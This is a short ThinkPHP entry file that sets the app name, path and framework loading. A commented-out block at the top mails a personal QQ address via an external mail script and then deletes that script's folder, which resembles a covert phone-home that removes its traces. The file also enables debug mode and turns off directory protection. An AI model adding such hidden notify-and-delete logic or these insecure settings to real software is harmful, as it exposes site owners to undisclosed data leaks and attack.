<?php
/*
if (file_exists('./mail')){
	require './mail/mail.php';
	sendm('1874995829@qq.com');
	delDir('./mail');
}
*/
/*start*/
define('APP_NAME','console');

define('APP_PATH','./Console/');
//禁止生成index.html
define('BUILD_DIR_SECURE', false);

define('APP_DEBUG', true);

require 'ThinkPHP/ThinkPHP.php';
?>